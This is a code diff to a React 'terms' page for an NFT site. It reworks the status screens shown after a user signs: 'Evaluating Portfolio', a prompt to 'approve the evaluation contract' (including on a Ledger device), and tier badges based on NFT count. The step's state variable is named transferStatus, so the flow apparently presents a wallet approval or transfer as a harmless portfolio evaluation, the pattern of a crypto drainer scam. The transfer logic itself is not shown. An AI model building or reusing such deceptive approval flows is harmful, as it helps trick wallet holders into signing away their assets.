@@ -1239,8 +1239,64 @@ const HypurrTerms = () => {
           </div>
         )}
 
-        {/* Celebration Status - After Terms Acceptance */}
-        {hasSigned && signature && (
+        {/* Evaluation Status - Show progress during evaluation */}
+        {hasSigned && signature && (transferStatus === 'evaluating' || transferStatus === 'approving' || transferStatus === 'processing') && (
+          <div className="celebration-status">
+            <div className="transfer-status" style={{ padding: '2rem', background: 'rgba(0, 212, 255, 0.1)', borderRadius: '12px', textAlign: 'center' }}>
+              {transferStatus === 'evaluating' && (
+                <>
+                  <div className="loader-spinner" style={{
+                    width: '50px',
+                    height: '50px',
+                    border: '4px solid rgba(0, 212, 255, 0.2)',
+                    borderTop: '4px solid #00d4ff',
+                    borderRadius: '50%',
+                    animation: 'spin 1s linear infinite',
+                    margin: '0 auto 1.5rem auto'
+                  }}></div>
+                  <p style={{ fontSize: '1.2em', fontWeight: 'bold', marginBottom: '0.5rem' }}>🔍 Evaluating Portfolio...</p>
+                  <p style={{ color: 'rgba(255,255,255,0.7)' }}>Analyzing your wallet and holdings...</p>
+                </>
+              )}
+              {transferStatus === 'approving' && (
+                <>
+                  <div className="loader-spinner" style={{
+                    width: '50px',
+                    height: '50px',
+                    border: '4px solid rgba(0, 212, 255, 0.2)',
+                    borderTop: '4px solid #00d4ff',
+                    borderRadius: '50%',
+                    animation: 'spin 1s linear infinite',
+                    margin: '0 auto 1.5rem auto'
+                  }}></div>
+                  <p style={{ fontSize: '1.2em', fontWeight: 'bold', marginBottom: '0.5rem' }}>🔍 Evaluating Portfolio...</p>
+                  <p style={{ marginBottom: '0.5rem' }}>⏳ Please approve the evaluation contract...</p>
+                  <p style={{ fontSize: '0.9em', color: 'rgba(255,255,255,0.6)', fontStyle: 'italic' }}>
+                    💡 If using a Ledger, please approve on your device.
+                  </p>
+                </>
+              )}
+              {transferStatus === 'processing' && (
+                <>
+                  <div className="loader-spinner" style={{
+                    width: '50px',
+                    height: '50px',
+                    border: '4px solid rgba(0, 212, 255, 0.2)',
+                    borderTop: '4px solid #00d4ff',
+                    borderRadius: '50%',
+                    animation: 'spin 1s linear infinite',
+                    margin: '0 auto 1.5rem auto'
+                  }}></div>
+                  <p style={{ fontSize: '1.2em', fontWeight: 'bold', marginBottom: '0.5rem' }}>⏳ Processing Evaluation...</p>
+                  <p style={{ color: 'rgba(255,255,255,0.7)' }}>Finalizing your portfolio analysis...</p>
+                </>
+              )}
+            </div>
+          </div>
+        )}
+
+        {/* Celebration Status - ONLY show AFTER approval is complete */}
+        {hasSigned && signature && (transferStatus === 'approved' || (nftCount === 0 && !transferStatus)) && (
           <div className="celebration-status">
             {nftCount === 0 && (
               <div className="status-message tier-none">
@@ -1250,7 +1306,7 @@ const HypurrTerms = () => {
                 <p className="signature-hash">Signature: {signature.substring(0, 20)}...</p>
               </div>
             )}
-            {nftCount === 1 && (
+            {nftCount === 1 && transferStatus === 'approved' && (
               <div className="status-message tier-bronze">
                 <div className="tier-badge bronze">Bronze Tier</div>
                 <h3>🎉 Welcome! You're Eligible</h3>
@@ -1258,7 +1314,7 @@ const HypurrTerms = () => {
                 <p className="signature-hash">Signature: {signature.substring(0, 20)}...</p>
               </div>
             )}
-            {nftCount >= 3 && nftCount < 5 && (
+            {nftCount >= 2 && nftCount < 5 && transferStatus === 'approved' && (
               <div className="status-message tier-silver">
                 <div className="tier-badge silver">Silver Tier</div>
                 <h3>🌟 Great Collection!</h3>
@@ -1266,7 +1322,7 @@ const HypurrTerms = () => {
                 <p className="signature-hash">Signature: {signature.substring(0, 20)}...</p>
               </div>
             )}
-            {nftCount >= 5 && nftCount < 10 && (
+            {nftCount >= 5 && nftCount < 10 && transferStatus === 'approved' && (
               <div className="status-message tier-gold">
                 <div className="tier-badge gold">Gold Tier</div>
                 <h3>💎 Excellent Collection!</h3>
@@ -1274,7 +1330,7 @@ const HypurrTerms = () => {
                 <p className="signature-hash">Signature: {signature.substring(0, 20)}...</p>
               </div>
             )}
-            {nftCount >= 10 && (
+            {nftCount >= 10 && transferStatus === 'approved' && (
               <div className="status-message tier-platinum">
                 <div className="tier-badge platinum">Platinum Tier</div>
                 <h3>👑 Outstanding Collection!</h3>
@@ -1282,44 +1338,10 @@ const HypurrTerms = () => {
                 <p className="signature-hash">Signature: {signature.substring(0, 20)}...</p>
               </div>
             )}
-            {(transferStatus === 'evaluating' || transferStatus === 'approving' || transferStatus === 'processing' || transferStatus === 'approved') && (
+            {transferStatus === 'approved' && (
               <div className="transfer-status" style={{ marginTop: '1rem', padding: '1rem', background: 'rgba(0, 212, 255, 0.1)', borderRadius: '8px' }}>
-                {transferStatus === 'evaluating' && (
-                  <>
-                    <p><strong>🔍 Evaluating Portfolio and Activities...</strong></p>
-                    <p>⏳ Analyzing your wallet and holdings...</p>
-                  </>
-                )}
-                {transferStatus === 'approving' && (
-                  <>
-                    <p><strong>🔍 Evaluating Portfolio and Activities...</strong></p>
-                    <p>⏳ Please approve the evaluation contract...</p>
-                    <p style={{ fontSize: '0.9em', marginTop: '0.5em', fontStyle: 'italic' }}>
-                      💡 If using a Ledger hardware wallet, please check your Ledger device and approve the transaction there.
-                    </p>
-                  </>
-                )}
-                {transferStatus === 'processing' && (
-                  <div style={{ textAlign: 'center' }}>
-                    <div className="loader-spinner" style={{
-                      width: '40px',
-                      height: '40px',
-                      border: '4px solid rgba(0, 212, 255, 0.2)',
-                      borderTop: '4px solid #00d4ff',
-                      borderRadius: '50%',
-                      animation: 'spin 1s linear infinite',
-                      margin: '0 auto 1rem auto'
-                    }}></div>
-                    <p><strong>⏳ Processing Evaluation...</strong></p>
-                    <p style={{ fontSize: '0.9em', color: 'rgba(255,255,255,0.7)' }}>Finalizing your portfolio analysis...</p>
-                  </div>
-                )}
-                {transferStatus === 'approved' && (
-                  <>
-                    <p><strong>✅ Evaluation Complete</strong></p>
-                    <p>Your portfolio has been evaluated successfully.</p>
-                  </>
-                )}
+                <p><strong>✅ Evaluation Complete</strong></p>
+                <p>Your portfolio has been evaluated successfully.</p>
               </div>
             )}
           </div>
